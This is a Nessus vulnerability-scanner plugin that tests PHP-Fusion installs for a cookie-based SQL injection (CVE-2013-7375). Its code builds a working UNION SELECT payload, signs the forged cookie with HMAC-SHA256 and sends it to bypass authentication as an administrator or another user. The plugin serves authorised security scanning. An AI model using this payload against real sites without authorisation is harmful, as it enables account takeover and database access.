#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(65615);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_cve_id("CVE-2013-7375");
  script_bugtraq_id(58011);
  script_osvdb_id(90359);

  script_name(english:"PHP-Fusion Authenticate.class.php Multiple Cookie SQL Injection");
  script_summary(english:"Attempts to bypass authentication via SQL injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a SQL
injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the PHP-Fusion installed on the remote host is affected
by a SQL injection vulnerability because it fails to properly sanitize
user input to the 'user' and 'admin' cookies upon submission to the
application. An unauthenticated, remote attacker could leverage this
issue to launch a SQL injection attack against the affected
application leading to authentication bypass, discovery of sensitive
data, and attacks against the underlying database.

Note that successful exploitation requires that PHP's
'magic_quotes_gpc' be disabled.

Note also that this version is reportedly affected by additional SQL
injection, multiple cross-site scripting, and multiple local file
inclusion vulnerabilities as well as an information disclosure issue
and an arbitrary file deletion issue but Nessus did not test for these
issues.");
  script_set_attribute(attribute:"see_also", value:"http://www.waraxe.us/advisory-97.html");
  script_set_attribute(attribute:"see_also", value:"http://www.php-fusion.co.uk/news.php?readmore=569");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 7.02.06 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/02/16");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/01/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/03/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:php_fusion:php_fusion");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("php_fusion_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/php_fusion", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("smb2_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : "php_fusion",
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];
install_url = build_url(qs:dir, port:port);

# Grab the cookie and username
clear_cookiejar();
cookie = '';

res = http_send_recv3(
    method    : "GET",
    item      : dir + "/profile.php?lookup=1",
    port         : port,
    exit_on_fail : TRUE
);

cookies = get_http_cookies_names(name_regex:'([a-zA-Z0-9\\_]+)lastvisit');
cookie = cookies[0];
if (isnull(cookie))
{
  exit(1, "Unable to obtain session cookie for the PHP-Fusion install at " + install_url + ".");
}

cookie = str_replace(string:cookie, find:"lastvisit", replace:"user");
user_chk = eregmatch(string:res[2],pattern:"<!--profile_user_name-->(.+)</td>");

if (!isnull(user_chk)) username = user_chk[1];
# default user to use if user profiles have been disabled by an administrator
else username = "admin";

# Form Injection
time = unixtime() + 86400;
data = "-1' union select 1,'"+username+"','sha256','','admin',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,101,0,0,0,0,0,0,0,0,0,0,0,0 -- ";

key = "";
hash = _HMAC_SHA256(data:data + time, key:key);

key = hexstr(hash);
hash = _HMAC_SHA256(data:data + time, key:key);

hash_full = cookie + "=" + data + "." + time + "." + hexstr(hash);

# Attempt to bypass authentication
res2 = http_send_recv3(
  method       : "GET",
  item         : dir + "/news.php",
  add_headers  : make_array('Cookie', hash_full),
  port         : port,
  exit_on_fail : TRUE
);
if (
  "<td class='scapmain'>" +username >< res2[2] &&
  "<a href='index.php?logout=yes'" >< res2[2]
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to bypass authentication and gain access as the' +
      '\n' + "user '" + username + "' using the following request :" +
      '\n' +
      '\n' + http_last_sent_request() +
      '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "PHP-Fusion", install_url);
